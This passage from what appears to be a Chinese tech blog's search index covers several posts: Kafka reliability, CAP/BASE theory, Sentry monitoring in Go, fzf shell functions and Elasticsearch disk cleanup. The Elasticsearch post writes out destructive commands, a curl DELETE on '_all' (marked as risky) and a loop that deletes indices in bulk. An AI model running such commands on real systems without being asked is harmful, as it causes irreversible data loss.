的物理位移，然后找到目标消息。另外可以通过 mmap（memory mapped files） 读写上面提到的稀疏索引文件，进一步提高查询消息的速度。\n\n因为索引文件是稀疏的，它们相对较小。将它们映射到内存中可以加快查找过程，这是内存映射文件提供的主要好处。\n\n> 注意：mmap 和 page cache 是两个概念，网上很多资料把它们混淆在一起。此外，还有资料谈到 Kafka 在读 log 文件时也用到了 mmap，通过对 2.8.0 版本的源码分析，这个信息也是错误的，其实只有索引文件的读写才用到了 mmap。\n\n# 2. 头脑风暴\n\n### 2.1 kafka性能高的原因\n\n<img src=\"kafka原理和高可用/640.png\" alt=\"图片\" style=\"zoom:50%;\" />\n\n1. 批量发送，消息压缩。\n\n2. 磁盘顺序写 \n\n3. 利用操作系统页缓存 PageCache\n\n4. 零拷贝技术\n\n5. 分区并发\n\n   \n\n### 2.2 怎么保证消息顺序\n\n##### 1. 生产者顺序\n\n要严格保证 Kafka 发消息有序，首先要考虑同步发送消息。\n\n+ 设置消息响应参数 `acks > 0`\n+ 调用 send 方法返回的 Future 对象的 get 方式阻塞等待结果。\n+ 设置 `enable.idempotence = true`，幂等特性这个特性可以给消息添加序列号，每次发送，会把序列号递增 1。\n\n##### 2. broker顺序\n\n+ 同类别消息有同样的 key，就会被分配到同样的分区中，保证有序。\n+ 1个Topic（主题）只创建1个Partition(分区)。\n\n##### 3. 消费者顺序\n\n+ 只使用一个消费者。\n+ 消费端采用一个阻塞队列。\n+ 提高消费端的处理性能避免触发Balance。\n\n\n\n### 2.3 如何避免丢失消息\n\n##### 1. 生产端丢失\n\nKafka Producer 是异步发送消息的，也就是说如果你调用的是 producer.send(msg) 这个 API，那么它通常会立即返回，但此时你不能认为消息发送已成功完成。\n\n解决方案：\n\n+ Producer 永远要使用带有回调通知的发送 API，也就是说不要使用 producer.send(msg)，而要使用 producer.send(msg, callback)。\n+ 配置了 retries > 0 的 Producer 能够自动重试消息发送，避免消息丢失。\n\n##### 2.  Broker 端丢失\n\nBroker 端丢失消息才真的是因为 Kafka 造成的。\n\nKafka 收到消息后会先存储在也缓存中(Page Cache)中，之后由操作系统根据自己的策略进行刷盘或者通过 fsync 命令强制刷盘。如果系统挂掉，在 PageCache 中的数据就会丢失。\n\n解决方案：\n\n+ 设置 acks = all。acks 是 Producer 的一个参数，所有副本 Broker 都要接收到消息，该消息才算是“已提交”。\n+ 设置 unclean.leader.election.enable = false。这是 Broker 端的参数，落后太多的不能成为新的 Leader。\n+ 设置 replication.factor >= 3。这也是 Broker 端的参数。将消息多保存几份冗余。\n+ 设置 min.insync.replicas > 1。这依然是 Broker 端参数，控制的是消息至少要被写入到多少个副本才算是“已提交”。\n\n##### 3. 消费端丢失\n\n消费端没有正确消费消息，就把位移提交了，导致 Kafka 认为该消息已经被消费了，从而导致消息丢失。\n\n解决方案：\n\n+ 确定消费完成后才提交消息，如果是多线程异步处理消费消息，Consumer 程序不要开启自动提交位移，而是要应用程序手动提交位移。\n\n\n\n### 2.4 如何避免重复消费\n\n##### 1. 产生原因\n\n+ 提交间隔宕机\n\n  默认情况下，消息消费完以后，会自动提交Offset的值，避免重复消费。Kafka消费端的自动提交逻辑有一个默认的5秒间隔，也就是说在5秒之后的下一次向Broker拉取消息的时候提交。\n\n  所以在Consumer消费的过程中，应用程序被强制kill掉或者宕机，可能会导致Offset没提交，从而产生重复提交的问题。\n\n+ 再平衡\n\n  在Kafka里面有一个Partition Balance机制，就是把多个Partition均衡的分配给多个消费者。如果Consumer在默认的5分钟内没办法处理完这一批消息，就会触发Kafka的Rebalance机制，从而导致Offset自动提交失败。\n\n  而在重新Rebalance之后，Consumer还是会从之前没提交的Offset位置开始消费，也会导致消息重复消费的问题\n\n##### 2. 解决方案\n\n+ 提高消费端的处理性能避免触发Balance，比如可以用异步的方式来处理消息，缩短单个消息消费的时间。或者还可以调整消息处理的超时时间。还可以减少一次性从Broker上拉取数据的条数。\n+ 可以针对消息生成md5然后保存到mysql或者redis里面，在处理消息之前先去mysql或者redis里面判断是否已经消费过。这个方案其实就是利用幂等性的思想。\n\n\n\n# 3. 参考资料\n\n+ https://colobu.com/2019/09/27/install-Kafka-on-Mac/\n+ https://tonybai.com/2022/03/28/the-comparison-of-the-go-community-leading-kakfa-clients/\n+ https://cloud.tencent.com/developer/article/1541215\n+ https://www.lixueduan.com/posts/kafka/09-avoid-msg-lost/\n+ https://mp.weixin.qq.com/s/YJFltTP4J5si1Z5SbuMUJw\n+ kafka权威指南2.0\n","tags":["kafka"],"categories":["消息队列"]},{"title":"分布式CAP和BASE理论","url":"%2Fp%2F76302eca.html","content":"\n理解分布式之前，需要理解一个问题就是\"事务\"。\n\n# 1. 本地事务\n\n事务提供一种机制将一个活动涉及的所有操作纳入到一个不可分割的执行单元，组成事务的所有操作只有在所有操作均能正常执行的情况下方能提交，只要其中任一操作执行失败，都将导致整个事务的回滚。\n\n简单地说，事务提供一种“ **要么什么都不做，要么做全套（All or Nothing）**”机制。\n\n<!-- more -->\n\n<img src=\"分布式CAP和BASE理论/126-分布式5.jpeg\" alt=\"img\" style=\"zoom: 33%;\" />\n\n### 1.1 ACID理论\n\n 事务是基于数据进行操作，需要保证事务的数据通常存储在数据库中，所以介绍到事务，就不得不介绍数据库事务的`ACID`特性，指数据库事务正确执行的四个基本特性的缩写。包含：\n\n- **原子性（Atomicity）**\n- **一致性（Consistency）**\n- **隔离性（Isolation）**\n- **持久性（Durability）**\n\n##### 1. 原子性（Atomicity）\n\n 整个事务中的所有操作，要么全部完成，要么全部不完成，不可能停滞在中间某个环节。\n\n##### 2. **一致性（Consistency）**\n\n在事务开始之前和事务结束以后，数据库数据的一致性约束没有被破坏。\n\n##### 3. 隔离性（Isolation）\n\n 数据库允许多个并发事务同时对数据进行读写和修改的能力，如果一个事务要访问的数据正在被另外一个事务修改，只要另外一个事务未提交，它所访问的数据就不受未提交事务的影响。隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。\n\n#####  4. 持久性（Durability)\n\n 事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。\n\n 本地事务ACID实际上可用”统一提交，失败回滚“几个字总结，严格保证了同一事务内数据的一致性！\n\n而分布式事务不能实现这种`ACID`。因为有CAP理论约束。接下来我们来了解一下，分布式中是如何保证以上特性的，那么就有了一个著名的CAP理论。\n\n# 2. 分布式事务\n\n### 2.1 CAP 理论\n\n在设计一个大规模可扩放的网络服务时候会遇到三个特性：一致性（consistency）、可用性（Availability）、分区容错（partition-tolerance）都需要的情景.\n\n CAP定律说的是在一个分布式计算机系统中，一致性，可用性和分区容错性这三种保证无法同时得到满足，最多满足两个。\n\n<img src=\"分布式CAP和BASE理论/129-CAP1.jpeg\" alt=\"img\" style=\"zoom: 33%;\" />\n\n### 2.2 流程演示\n\n<img src=\"分布式CAP和BASE理论/130-CAP2.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n该场景整体分为5个流程：\n\n流程一、客户端发送请求(如:添加订单、修改订单、删除订单)\n\n流程二、Web业务层处理业务，并修改存储成数据信息\n\n流程三、存储层内部Master与Backup的数据同步\n\n流程四、Web业务层从存储层取出数据\n\n流程五、Web业务层返回数据给客户端\n\n##### 1. 一致性(Consistency)\n\n“all nodes see the same data at the same time”\n\n一旦数据更新完成并成功返回客户端后，那么分布式系统中所有节点在同一时间的数据完全一致。\n\n在CAP的一致性中还包括强一致性、弱一致性、最终一致性等级别。\n\n一致性是指写操作后的读操作可以读取到最新的数据状态，当数据分布在多个节点上，从任意结点读取到的数据都是最新的状态。\n\n**一致性实现目标：**\nWeb业务层向主Master写数据库成功，从Backup读数据也成功。\n\n<img src=\"分布式CAP和BASE理论/133-CAP5.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n**一致性特点：**\n\n+ 由于存在数据同步的过程，写操作的响应会有一定的延迟。\n+ 为了保证数据一致性会对资源暂时锁定，待数据同步完成释放锁定资源。\n+ 如果请求数据同步失败的结点则会返回错误信息，一定不会返回旧数据。\n\n##### 2. 可用性(Availability)\n\n> “`Reads and writes always succeed`”\n\n服务一直可用，而且是正常响应时间。对于可用性的衡量标准如下：\n\n| 可用性分类                   | 可用水平（%） | 一年中可容忍停机时间 |\n| ---------------------------- | ------------- | -------------------- |\n| 容错可用性                   | 99.9999       | <1 min               |\n| 极高可用性                   | 99.999        | <5 min               |\n| 具有故障自动恢复能力的可用性 | 99.99         | <53 min              |\n| 高可用性                     | 99.9          | <8.8h                |\n| 商品可用性                   | 99            | <43.8 min            |\n\n**可用性实现目标：**\n\n- 当Master正在被更新，Backup数据库接收到数据查询的请求则立即能够响应数据查询结果。\n- backup数据库不允许出现响应超时或响应错误。\n\n<img src=\"分布式CAP和BASE理论/134-CAP6.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n1. 写入Master主数据库后要将数据同步到从数据库。\n2. 由于要保证Backup从数据库的可用性，不可将Backup从数据库中的资源进行锁定。\n3. 即时数据还没有同步过来，从数据库也要返回要查询的数据，哪怕是旧数据/或者默认数据，但不能返回错误或响应超时。\n\n**可用性特点：**\n\n+ 所有请求都有响应，且不会出现响应超时或响应错误。\n\n##### 3. 分区容错性(Partition tolerance)\n\n分布式系统中，尽管部分节点出现任何消息丢失或者故障，系统应继续运行。\n\n通常分布式系统的各各结点部署在不同的子网，这就是网络分区，不可避免的会出现由于网络问题而导致结点之间通信失败，此时仍可对外提供服务。\n\n**分区容错性实现目标：**\n主数据库向从数据库同步数据失败不影响读写操作。\n\n<img src=\"分布式CAP和BASE理论/136-CAP8.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n其一个结点挂掉不影响另一个结点对外提供服务。\n\n<img src=\"分布式CAP和BASE理论/137-CAP9.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n**必要实现流程：**\n\n1. 尽量使用异步取代同步操作，例如使用异步方式将数据从主数据库同步到从数据，这样结点之间能有效的实现松耦合。\n2. 添加Backup从数据库结点，其中一个Backup从结点挂掉其它Backup从结点提供服务。\n\n<img src=\"分布式CAP和BASE理论/138-CAP10.jpeg\" alt=\"img\" style=\"zoom:33%;\" />\n\n\n\n**分区容错性特点：**\n\n分区容忍性分是布式系统具备的基本能力。\n\n\n\n### 2.3 CAP牺牲谁\n\n<img src=\"分布式CAP和BASE理论/140-CAP12.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n假设在N1和N2之间网络断开的时候，\n\nA、用户向`Host1`发送数据更新请求，那`Host1`中的数据`Data(0)`将被更新为`Data(1)`\n\nB、若此时`Host1`和`Host2`网络是断开的，所以分布式系统同步操作将失败，`Host2`中的数据依旧是`Data(0)`\n\nC、有用户向`Host2`发送数据读取请求，由于数据还没有进行同步，`Process2`没办法立即给用户返回最新的数据V1，那么将面临两个选择。\n\n第一，牺牲`数据一致性(c)`，响应旧的数据`Data(0)`给用户；\n\n第二，牺牲`可用性(A)`，阻塞等待，直到网络连接恢复，数据同步完成之后，再给用户响应最新的数据`Data(1)`。\n\n**这个过程，证明了要满足`分区容错性(p)`的分布式系统，只能在`一致性(C)`和`可用性(A)`两者中，选择其中一个。**\n\n##### 1. CA 放弃 P （别你别叫分布式了）\n\n一个分布式系统中，不可能存在不满足P，放弃`分区容错性(p)`，即不进行分区，不考虑由于网络不通或结点挂掉的问题，则可以实现一致性和可用性。那么系统将不是一个标准的分布式系统。\n\n对于一个分布式系统来说。P是一个基本要求，CAP三者中，只能在CA两者之间做权衡，并且要想尽办法提升P。\n\n##### 2. CP 放弃 A （银行转账保证一致性）\n\n如果一个分布式系统不要求强的可用性，即容许系统停机或者长时间无响应的话，就可以在CAP三者中保障CP而舍弃A。\n\n放弃可用性，追求一致性和分区容错性，如Redis、HBase等，还有分布式系统中常用的Zookeeper也是在CAP三者之中选择优先保证CP的。\n\n场景：\n\n跨行转账，一次转账请求要等待双方银行系统都完成整个事务才算完成。\n\n##### 3. AP 放弃 C （常用，例如社交系统）\n\n放弃一致性，追求分区容忍性和可用性。这是很多分布式系统设计时的选择。实现AP，前提是只要用户可以接受所查询的到数据在一定时间内不是最新的即可。\n\n**通常实现AP都会保证最终一致性**，后面讲的BASE理论就是根据AP来扩展的。\n\n\n\n#### 2.4 CAP理论如何设计一个电商系统？\n\n1. 对于用户模块，包括登录，个人设置，个人订单，购物车，收藏夹等，这些模块保证AP，数据短时间不一致不影响使用。\n\n2. 订单模块的下单付款扣减库存操作是整个系统的核心，CA都需要保证，极端情况下面牺牲A保证C 。\n3. 商品模块的商品上下架和库存管理保证CP。\n4. 搜索功能因为本身就不是实时性非常高的模块，所以保证AP就可以了。 \n5. 促销是短时间的数据不一致，结果就是优惠信息看不到，但是已有的优惠要保证可用，而且优惠可以提前预计算，所以可以保证AP。\n6. 支付这一块是独立的系统，或者使用第三方的支付宝，微信。其实CAP是由第三方来保证的，支付系统是一个对CAP要求极高的系统，C是必须要保证的，AP中A相对更重要，不能因为分区，导致所有人都不能支付。\n\n\n\n# 3. AP下的 BASE 理论\n\n CAP 不可能同时满足，而`分区容错性(P)`是对于分布式系统而言是必须的。如果系统能够同时实现 CAP 是再好不过的了，所以出现了 BASE 理论，BASE 是 CAP 理论中 AP 方案的延伸。\n\n### 3.1 BASE 理论\n\nBASE 是 Basically Available（基本可用） 、Soft-state（软状态） 和 Eventually Consistent（最终一致性） 三个短语的缩写。\n\n核心思想:\n即使无法做到强一致性，但每个应用都可以根据自身业务特点，采用适当的方式来使系统达到最终一致性。\n\n### 3.2 ACID和BASE\n\n两个对冲理念：ACID和BASE。\n\nACID是传统数据库常用的设计理念，追求强一致性模型。\n\nBASE支持的是大型分布式系统，提出通过牺牲强一致性获得高可用性。\n\n### 3.3 Basically Available(基本可用)\n\n实际上就是两个妥协。\n\n+ 对响应上时间的妥协：正常情况下，一个在线搜索引擎需要在0.5秒之内返回给用户相应的查询结果，但由于出现故障（比如系统部分机房发生断电或断网故障），查询结果的响应时间增加到了1~2秒。\n\n+ 对功能损失的妥协：正常情况下，在一个电子商务网站（比如淘宝）上购物，消费者几乎能够顺利地完成每一笔订单。但在一些节日大促购物高峰的时候（比如双十一、双十二），由于消费者的购物行为激增，为了保护系统的稳定性（或者保证一致性），部分消费者可能会被引导到一个降级页面。\n\n### 3.4 Soft state（软状态）\n\n- 原子性（硬状态） -> 要求多个节点的数据副本都是一致的,这是一种\"硬状态\"\n\n  <img src=\"分布式CAP和BASE理论/143-Base2.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n- 软状态（弱状态） -> 允许系统中的数据存在中间状态,并认为该状态不影响系统的整体可用性,即允许系统在多个不同节点的数据副本存在数据延迟。\n\n  <img src=\"分布式CAP和BASE理论/144-Base2.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n### 3.5 Eventually consistent（最终一致性）\n\n上面说软状态，然后不可能一直是软状态，必须有个时间期限。在期限过后，应当保证所有副本保持数据一致性。从而达到数据的最终一致性。这个时间期限取决于网络延时，系统负载，数据复制方案设计等等因素。\n\n<img src=\"分布式CAP和BASE理论/145-Base3.jpeg\" alt=\"img\" style=\"zoom:50%;\" />\n\n稍微官方一点的说法就是：\n\n系统能够保证在没有其他新的更新操作的情况下，数据最终一定能够达到一致的状态，因此所有客户端对系统的数据访问最终都能够获取到最新的值。\n\n# 4. 参考资料\n\n+ https://www.cnblogs.com/savorboard/p/distributed-system-transaction-consistency.html\n+ https://github.com/Snailclimb/JavaGuide/blob/master/docs/system-design/distributed-system/CAP%E7%90%86%E8%AE%BA.md\n+ https://github.com/aceld/golang/blob/main/2%E3%80%81%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%8EACID%E3%80%81CAP%E3%80%81BASE%E7%9A%84%E7%90%86%E8%AE%BA%E6%8E%A8%E8%BF%9B.md\n\n","tags":["分布式"],"categories":["分布式"]},{"title":"sentry监控与golang的使用","url":"%2Fp%2F2f428470.html","content":"\nSentry 是一个开源的非常强大的实时异常收集系统，可以为开发者的提供帮助、诊断，修复和优化其代码的性能的能力，可以用它来监控线上服务的健康状态，实时收集的异常堆栈信息可以帮助我们快速发现、定位和修复问题。\n\n<!-- more -->\n\n\n# 1. 安装使用\n\n### 1.1 安装\n\n```bash\ngit clone https://github.com/getsentry/self-hosted sentry\nsudo ./install.sh\nsudo docker-compose up -d\n```\n\n<img src=\"sentry监控与golang的使用/image-20220727112838445.png\" alt=\"image-20220727112838445\" style=\"zoom: 25%;\" />\n\n+ 报错\n\n  ▶ Detecting Docker platform\n  panic: reflect: indirection through nil pointer to embedded struct [recovered]\n\n  ```bash\n  # 确认下docker和docker-compose版本是否满足\n  sudo curl -L https://github.com/docker/compose/releases/download/v2.7.0/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose\n  \n  sudo chmod +x /usr/local/bin/docker-compose\n  ```\n\n\n\n### 1.2 创建项目\n\n+ 访问9000端口，创建用户，这时候一定要放开注册。\n\n + create project\n + Go 项目\n\n\n\n### 1.3 配置邮箱\n\n```bash\nsudo docker-compose down\nsudo docker-compose build --force-rm\nsudo docker-compose run --rm web upgrade\nsudo docker-compose up -d\n```\n\n进入页面，在左上角的你的昵称位置单击，选择Admin。\n\n然后在左侧选择**Mail**，然后在最下面有一个测试设置。点击“向送一封测试邮件”。如果收到的话，那么说明就配置成功了。\n\n\n\n# 2. 代码\n\n### 2.1 添加中间件\n\n```go\nimport\tsentrygin \"github.com/getsentry/sentry-go/gin\"\n\nappEngine.Use(sentrygin.New(sentrygin.Options{}))\nappEngine.Use(sentry.CaptureSentryMiddleware)\n\n\n\nfunc Init() {\n\t//TODO: DSN 配置\n\terr := sentry.Init(sentry.ClientOptions{\n\t\tDsn: \"http://1ccf51b1319f49c48e95cb56b7dc8fc4@192.168.40.98:9000/2\",\n\t\t// Set TracesSampleRate to 1.0 to capture 100%\n\t\t// of transactions for performance monitoring.\n\t\t// We recommend adjusting this value in production,\n\t\tTracesSampleRate: 1.0,\n\t})\n\tif err != nil {\n\t\tlqlog.Info(\"sentry init err:%v\", err)\n\t\treturn\n\t}\n\treturn\n}\n```\n\n### 2.2 上报\n\n```go\npackage sentry\n\nimport (\n\t\"bytes\"\n\t\"encoding/json\"\n\n\t\"github.com/getsentry/sentry-go\"\n\tsentrygin \"github.com/getsentry/sentry-go/gin\"\n\t\"github.com/gin-gonic/gin\"\n)\n\ntype bodyLogWriter struct {\n\tgin.ResponseWriter\n\tbody *bytes.Buffer\n}\n\nfunc (w bodyLogWriter) Write(b []byte) (int, error) {\n\tw.body.Write(b)\n\treturn w.ResponseWriter.Write(b)\n}\n\nfunc CaptureSentryMiddleware(ctx *gin.Context) {\n\tblw := &bodyLogWriter{body: bytes.NewBufferString(\"\"), ResponseWriter: ctx.Writer}\n\tctx.Writer = blw\n\n\thub := sentrygin.GetHubFromContext(ctx)\n\tif hub == nil {\n\t\treturn\n\t}\n\thub.Scope().SetRequest(ctx.Request)\n\n\tctx.Next()\n\n\tstatusCode := ctx.Writer.Status()\n\tif statusCode >= 400 {\n\t\thub.WithScope(func(scope *sentry.Scope) {\n\t\t\tscope.SetExtra(\"code\", statusCode)\n\t\t\thub.CaptureMessage(blw.body.String())\n\t\t})\n\n\t} else if statusCode == 200 {\n\t\tresp := struct {\n\t\t\tErrCode    int64  `json:\"errCode\"`\n\t\t\tErrMsg     string `json:\"errMsg\"`\n\t\t\tErrMsgDesc string `json:\"errMsgDesc\"`\n\t\t}{}\n\t\t_ = json.Unmarshal([]byte(blw.body.String()), &resp)\n\t\tif resp.ErrCode != 0 {\n\t\t\thub.WithScope(func(scope *sentry.Scope) {\n\t\t\t\tscope.SetExtra(\"resp\", blw.body.String())\n\t\t\t\thub.CaptureMessage(ctx.Request.RequestURI)\n\t\t\t})\n\t\t}\n\t}\n}\n\n```\n\n\n\n# 3. 参考资料\n\n+ https://docs.sentry.io/platforms/go/\n+ https://zhuanlan.zhihu.com/p/293863914\n+ https://juejin.cn/post/7021804166771113998","tags":["sentry"],"categories":["软件"]},{"title":"fzf终端模糊搜索神器","url":"%2Fp%2Fa0700771.html","content":"\nfzf是一个通用的命令行模糊查找器, 通过输入模糊的关键词就可以定位文件或文件夹。结合其他工具(比如rg)可以完成非常多的工作，在工作中可以大幅提高你的工作效率。\n\nfzf可以用于文件、命令历史记录、进程、主机名、书签、git提交等。\n\n<!-- more -->\n\n# 1. fzf使用\n\n### 1.1 安装\n\n\n```bash\ngit clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf\n~/.fzf/install\nsource ~/.zshrc  \n```\n\n### 1.2 使用\n\n安装后, 可以执行下`fzf`, 先体验下, 另外 fzf 重写了 `ctrl+r` 搜索历史命令\n\n![image-20210318231127907](fzf终端模糊搜索神器/image-20210318231127907.png)\n\n```bash\nvim $(fzf)  # 搜索后, 回车直接用 vi 打开\nvim $(fzf --height 40%) # 高度40%打开\n```\n\n+ 搜索过程中, CTRL-J 和 CTRL-K 向上翻和向下翻\n\n+ bash和zsh的模糊完备, 默认触发是`**`,  例如: `vim **<TAB>`, 或 `cd **<TAB>`, 或 `ssh **<TAB>`, 简直好用到飞起.\n\n  ![image-20210318000439297](fzf终端模糊搜索神器/1.png)\n\n+ 一边查一边预览\n\n  ```bash\n  fzf --preview 'cat {}'\n  ```\n\n+ 可以配合管道使用\n\n  ```bash\n  ps -ef | fzf\n  seq 100 | fzf\n  history | fzf\n  ```\n\n  \n\n### 1.3 搜索语法\n\n| Token     | Match type                 | Description                          |\n| --------- | -------------------------- | ------------------------------------ |\n| `sbtrkt`  | fuzzy-match                | Items that match `sbtrkt`            |\n| `'wild`   | exact-match (quoted)       | Items that include `wild`            |\n| `^music`  | prefix-exact-match         | Items that start with `music`        |\n| `.mp3$`   | suffix-exact-match         | Items that end with `.mp3`           |\n| `!fire`   | inverse-exact-match        | Items that do not include `fire`     |\n| `!^music` | inverse-prefix-exact-match | Items that do not start with `music` |\n| `!.mp3$`  | inverse-suffix-exact-match | Items that do not end with `.mp3`    |\n\n\n\n### 1.4 和tmux结合\n\nfzf 安装后自带一个 fzf-tmux, 但是会新开一个 panel ,并不是很好用,  建议以弹窗形成弹出\n\n参考: https://www.liuvv.com/p/1104a363.html#3-fzf-tmux\n\n\n\n### 1.5 打开文件\n\nzsh 增加以下函数, ctrl-o 用 open 打开, ctrl-e 用 vim 打开\n\n```bash\n# Modified version where you can press\n#   - CTRL-O to open with `open` command,\n#   - CTRL-E or Enter key to open with the $EDITOR\nfo() {\n  IFS=$'\\n' out=(\"$(fzfp --preview 'cat {}' --query=\"$1\" --exit-0 --expect=ctrl-o,ctrl-e)\")\n  key=$(head -1 <<< \"$out\")\n  file=$(head -2 <<< \"$out\" | tail -1)\n  if [ -n \"$file\" ]; then\n    [ \"$key\" = ctrl-o ] && open \"$file\" || ${EDITOR:-vim} \"$file\"\n  fi\n}\n```\n\n![image-20210318231156159](fzf终端模糊搜索神器/image-20210318231156159.png)\n\n### 1.6 切换目录\n\nzsh 增加以下函数\n\n```bash\n# cd to selected directory\nfd() {\n  local dir\n  dir=$(find ${1:-.} -path '*/\\.*' -prune \\\n                  -o -type d -print 2> /dev/null | fzfp +m) &&\n  cd \"$dir\"\n}\n```\n\n\n\n### 1.7 搜索文件内容\n\nzsh 增加以下函数, 需要配合 `rg`命令\n\n```bash\n#find-in-file - usage: fif <searchTerm>\nfif() {\n  if [ ! \"$#\" -gt 0 ]; then echo \"Need a string to search for!\"; return 1; fi\n  rg --files-with-matches --no-messages \"$1\" | fzf --preview \"highlight -O ansi -l {} 2> /dev/null | rg --colors 'match:bg:yellow' --ignore-case --pretty --context 10 '$1' || rg --ignore-case --pretty --context 10 '$1' {}\"\n}\n```\n\n\n\n# 2. vim使用fzf\n\n### 2.1 安装\n\n```bash\nPlug 'junegunn/fzf', { 'do': { -> fzf#install() } } \"极限搜索文件\nPlug 'junegunn/fzf.vim'\nnnoremap <leader>fo :Files<CR>\"映射\nnnoremap <leader>fif :Rg<CR> \"映射\n```\n\n### 2.2 使用\n\n`:Files`\n\n![image-20210318230744605](fzf终端模糊搜索神器/2.png)\n\n`:Rg`\n\n![image-20210318230855552](fzf终端模糊搜索神器/3.png)\n\n\n\n# 3. 参考资料\n\n+ https://github.com/junegunn/fzf\n+ https://github.com/junegunn/fzf/wiki/Examples\n+ https://github.com/junegunn/fzf.vim","tags":["fzf"],"categories":["软件"]},{"title":"elasticsearch的磁盘清理","url":"%2Fp%2F4171ca07.html","content":"\n# 1. 基础命令\n\n### 1.1 查看健康\n\n```bash\n# 查看健康\ncurl -XGET 'http://localhost:9200/_cat/health?v'\n​\nepoch      timestamp cluster       status node.total node.data shards pri relo init unassign pending_tasks max_task_wait_time active_shards_percent\n​\n1675044251 02:04:11 elasticsearch yellow          1         1     83  83    0    0       69             0                  -                 54.6%\n​\n绿色表示一切正常, 黄色表示所有的数据可用但是部分副本还没有分配,红色表示部分数据因为某些原因不可用.\n```\n\n<!-- more -->\n\n### 1.2 查看节点和索引\n\n```bash\n# 查看节点\ncurl 'localhost:9200/_cat/nodes?v'\n\n\nip        heap.percent ram.percent cpu load_1m load_5m load_15m node.role   master name\n127.0.0.1           35          97  62    3.89    3.74     3.74 cdfhilmrstw *      ip-172-31-31-250\n\n\n# 查看所有索引\ncurl 'localhost:9200/_cat/indices?v&pretty'\n\n\nhealth status index                           uuid                   pri rep docs.count docs.deleted store.size pri.store.size\nyellow open   filebeat-7.12.0-2022.11.30      Ax1f5QezQHqIuOzNEZGeOg   1   1    1951589            0    751.4mb        751.4mb\ngreen  open   .kibana_task_manager_7.17.7_001 zXfuQUdyRK6GGy5XXSnF3w   1   0         17       381589     41.5mb         41.5mb\nyellow open   filebeat-7.12.0-2022.12.01      7S1VPbvTRA6uKaTjtb3e5g   1   1    2270280            0    881.1mb        881.1mb\nyellow open   filebeat-7.12.0-2022.12.02      ik_EIJx2SaCHmI4MwxZM7A   1   1    2967501            0      1.1gb          1.1gb\n```\n\n### 1.3 查看磁盘占用\n\n```bash\n# 查看占用列表\ncurl -XGET \"http://localhost:9200/_cat/shards?v\"  \n​\nindex                                                         shard prirep state          docs   store ip        node\nfilebeat-7.12.0-2022.12.17                                    0     p      STARTED    16922173   6.9gb 127.0.0.1 ip-172-31-31-250\n\n\n# 查看占用\ncurl -XGET 'http://localhost:9200/_cat/allocation?v'\n​\n83      291.9gb   403.8gb     80.8gb    484.6gb           83 127.0.0.1 127.0.0.1 ip-172-31-31-250\n69                                                                               UNASSIGNED\n\n\n# 查看磁盘\nsudo du -hs /var/lib/elasticsearch/\n\n292G    /var/lib/elasticsearch/\n```\n\n# 2. 索引命令\n\n访问 **Elasticsearch** 中的数据的 **pattern**（模式）。该 **pattern**（模式）可以概括如下 :\n\n```\n<REST Verb> /<Index>/<Type>/<ID>\n```\n\n### 2.1 索引操作\n\n```bash\n# 1. 创建 customer 索引\ncurl -XPUT 'localhost:9200/customer?pretty&pretty'\n\n{\n  \"acknowledged\" : true,\n  \"shards_acknowledged\" : true,\n  \"index\" : \"customer\"\n}\n\n\n# 2. 获取所有索引，能够看到新创建的\ncurl -XGET 'localhost:9200/_cat/indices?v&pretty'\nyellow open   customer                        oByO4i3IT96RAHiAyaYc4g   1   1          0            0       226b           226b\n\n\n# 3. 往 customer 索引增加 external 类型 id 为 1 的数据\ncurl -XPUT 'localhost:9200/customer/external/1?pretty&pretty' -H 'Content-Type: application/json' -d'{ \"name\": \"John Doe\" }'\n\n{\n  \"_index\" : \"customer\",\n  \"_type\" : \"external\",\n  \"_id\" : \"1\",\n  \"_version\" : 1,\n  \"result\" : \"created\",\n  \"_shards\" : {\n    \"total\" : 2,\n    \"successful\" : 1,\n    \"failed\" : 0\n  },\n  \"_seq_no\" : 0,\n  \"_primary_term\" : 1\n}\n\n\n# 4. 从索引查询数据\ncurl -XGET 'localhost:9200/customer/external/1?pretty&pretty'\n\n{\n  \"_index\" : \"customer\",\n  \"_type\" : \"external\",\n  \"_id\" : \"1\",\n  \"_version\" : 1,\n  \"_seq_no\" : 0,\n  \"_primary_term\" : 1,\n  \"found\" : true,\n  \"_source\" : {\n    \"name\" : \"John Doe\"\n  }\n}\n\n```\n\n### 2.2 删除索引\n\n```bash\n# 1. 删除一个索引\ncurl -XDELETE 'localhost:9200/customer?pretty&pretty'\n{\n  \"acknowledged\" : true\n}\n\n# 2. 获取所有索引\ncurl -XGET 'localhost:9200/_cat/indices?v&pretty'\n\n\n# 3. 删除所有数据[谨慎]\ncurl -XDELETE 'http://localhost:9200/_all'\n```\n\n# 3. 清理磁盘\n\n### 3.1 删除索引操作\n\n```bash\n# 1. 删除一些索引\ncurl -XDELETE 'localhost:9200/filebeat-7.12.0-2022.11.30?pretty'\ncurl -XDELETE 'localhost:9200/filebeat-7.12.0-2022.12.01?pretty'\ncurl -XDELETE 'localhost:9200/filebeat-7.12.0-2022.12.02?pretty'\ncurl -XDELETE 'localhost:9200/filebeat-7.12.0-2022.12.03?pretty'\n\n# 2. 获取索引列表\ncurl -XGET 'localhost:9200/_cat/indices?v&pretty'\n\n# 3. 获取磁盘占用\n\nshards disk.indices disk.used disk.avail disk.total disk.percent host      ip        node\n    73      276.9gb   389.3gb     95.3gb    484.6gb           80 127.0.0.1 127.0.0.1 ip-172-31-31-250\n    59                                                                               UNASSIGNED\n\n```\n\n### 3.2 批量删除操作\n\n```bash\n# 1. 获取要删除的索引\ncurl -XGET 'localhost:9200/_cat/shards' |awk '{print $1}' | grep filebeat| grep 2022 | uniq > /tmp/index_name.tmp\n\n# 2. 循环删除\nfor i in $(cat /tmp/index_name.tmp);do curl -XDELETE http://localhost:9200/$i;done\n\n# 3. 查询磁盘占用\ncurl -XGET 'http://localhost:9200/_cat/allocation?v'\n```\n\n### 3.3 循环删除脚本\n\n`vim 